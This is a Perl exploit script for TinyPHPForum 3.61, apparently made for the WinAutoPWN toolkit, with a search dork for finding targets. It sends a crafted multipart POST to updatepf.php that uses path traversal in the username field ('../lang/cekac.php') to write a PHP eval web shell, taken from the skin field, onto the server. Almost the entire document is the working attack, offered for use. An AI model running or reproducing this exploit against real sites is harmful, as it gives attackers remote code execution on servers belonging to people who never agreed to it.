#!/usr/bin/perl
use IO::Socket;

print q{

TinyPHPForum 3.61 File Disclosure / Code Execution Vulnerabilities  
Found : brain[pillow] 
Dork : "Powered by TinyPHPForum v3.61" 
Visit : brainpillow.cc, forum.antichat.ru, raz0r.name 
Mail : brainpillow@gmail.com

Exploit written by QUAKERDOOMER for WinAutoPWN
http://solidmecca.co.nr
(quakerdoomer [[<<at>>]] fmguy.com)


};


$host = $ARGV[0];
$port = '80';


if(!defined($host))
{

     print "Usage: $0 website.com\n";
	goto bhago;

}





$header = "POST /updatepf.php HTTP/1.1\r\n";
$header = $header."User-Agent: WinAUTOPWN v1.00 \r\n";
$header = $header."Host: localhost\r\n";
$header = $header."Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n";
$header = $header."Referer: http://localhost/profile.php?action=new\r\n";
$header = $header."Cookie: PHPSESSID=a2b64d278abd18347c1fd3c27a6dc1f2;\r\n";
$header = $header."Connection: Keep-Alive\r\n";
$header = $header."Content-Length: 1235\r\n";
$header = $header."Content-Type: multipart/form-data; boundary=----------feIyX3Pd15MPzClqGeALKe\r\n\n";

$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"sessionid\"\r\n\n";

$header = $header."a2b64d278abd18347c1fd3c27a6dc1f2\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"uname\"\r\n\n";

$header = $header."../lang/cekac.php\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"ulang\"\r\n\n";

$header = $header."big5\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"uskin\"\r\n\n";

$header = $header."<?php eval($_GET[c]);?>\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"email\"\r\n\n";

$header = $header."qwe@qwe.net\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"p1\"\r\n\n";

$header = $header."123qwe\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"p2\"\r\n\n";

$header = $header."123qwe\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"stat\"\r\n\n";

$header = $header."hack the planet\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"avatar\"\r\n\n";

$header = $header."image/avatars/bird1.jpg\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\n";

$header = $header."10240\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"userfile\"; filename=\"\"\r\n\n";


$header = $header."------------feIyX3Pd15MPzClqGeALKe\r\n";
$header = $header."Content-Disposition: form-data; name=\"type\"\r\n\n";

$header = $header."new\r\n";
$header = $header."------------feIyX3Pd15MPzClqGeALKe--\r\n\n";




$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "$port") || print "[*] Error!\n";
print $get1 $header;
#$get1->recv($buffer,50000);



bhago:
print EXIT